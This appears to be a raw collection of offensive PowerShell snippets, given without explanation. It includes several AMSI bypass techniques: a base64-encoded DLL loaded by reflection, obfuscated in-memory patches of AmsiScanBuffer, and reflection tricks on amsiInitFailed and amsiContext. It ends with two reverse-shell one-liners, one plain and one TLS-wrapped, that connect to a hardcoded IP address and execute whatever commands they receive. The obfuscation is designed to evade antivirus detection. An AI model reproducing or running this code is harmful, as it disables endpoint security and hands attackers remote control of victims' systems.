function Bypass-AMSI
{
    if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
        [Reflection.Assembly]::Load([Convert]::FromBase64String("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N0RBQ0VEAEJ5cGFzc0FNU0kAbXNjb3JsaWIAc3JjAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1NpemUAc2l6ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEFsbG9jSEdsb2JhbABNYXJzaGFsAEtlcm5lbDMyLmRsbABCeXBhc3NBTVNJLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24Ab3BfQWRkaXRpb24AWmVybwAuY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBSdW50aW1lSGVscGVycwBCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9w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")) | Out-Null
        Write-Output "DLL has been reflected";
    }
    [Bypass.AMSI]::Disable()
}

==============================================================================================================================

$c = ‘t’
$Win32 = @”
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport(“kernel32”)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport(“kernel32”)]
public static extern IntPtr LoadLibrary(string name);
[DllImport(“kernel32”)]
public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
“@
Add-Type $Win32
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
$notp = 0
$replace = ‘VirtualProtec’
[Win32]::(‘{0}{1}’ -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)

==============================================================================================================================

$kizax = @"
using System;
using System.Runtime.InteropServices;
public class kizax {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $kizax

$rykogwu = [kizax]::LoadLibrary("$(('àm'+'sî'+'.d'+'ll').noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))")
$iyslea = [kizax]::GetProcAddress($rykogwu, "$(('ÃmsîScân'+'Buffer').normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))")
$p = 0
[kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)
$aapt = "0xB8"
$qkwf = "0x57"
$snxi = "0x00"
$wnan = "0x07"
$nchj = "0x80"
$yywa = "0xC3"
$estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
[System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)

==============================================================================================================================

$teste = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static')
$teste.SetValue($null,$true)

==============================================================================================================================

$x=51;$a=[Ref].Assembly;$y=$x*1000;$b=$a.GetTypes();$z=$y-32;$c=ForEach($d in $b){$y=$y-1;$z=$y;if($d.Name -like '*ils'){$z=$z-1;$x=$y+$z;if($d.Name -like '*siUt*'){$y=$y+1;$x=$y;$y=$y-1;$d;break;};};};$x=$z;$e=$c.GetFields('NonPublic,Static');$y=$x-2;$g=ForEach($f in $e){if($f.Name -like '*ext'){$z=$z-1;$x=$y+$z;if($f.Name -like '*siCo*'){$y=$y+1;$x=$y;$y=$y-1;$f;break;};};};$z=324;$h=$g.GetValue($null);$x=$y-2;[IntPtr]$i=$h;$z=$x+2;[Int32[]]$j=@(0);$y=$z;[System.Runtime.InteropServices.Marshal]::Copy($j,0,$i,1);

==============================================================================================================================

powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('52.54.121.107', 443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

==============================================================================================================================

$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('52.54.121.107', 443);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()

==============================================================================================================================

$x=51
$a=[Ref].Assembly
$y=$x*1000
$b=$a.GetTypes()
$z=$y-32
$c=ForEach($d in $b){$y=$y-1;$z=$y;if($d.Name -like '*ils'){$z=$z-1;$x=$y+$z;if($d.Name -like 'siUt'){$y=$y+1;$x=$y;$y=$y-1;$d;break;};};}
$x=$z
$e=$c.GetFields('NonPublic,Static')
$y=$x-2
$g=ForEach($f in $e){if($f.Name -like '*ext'){$z=$z-1;$x=$y+$z;if($f.Name -like 'siCo'){$y=$y+1;$x=$y;$y=$y-1;$f;break;};};}
$z=324
$h=$g.GetValue($null)
$x=$y-2
[IntPtr]$i=$h
$z=$x+2
[Int32[]]$j=@(0)
$y=$z
[System.Runtime.InteropServices.Marshal]::Copy($j,0,$i,1)

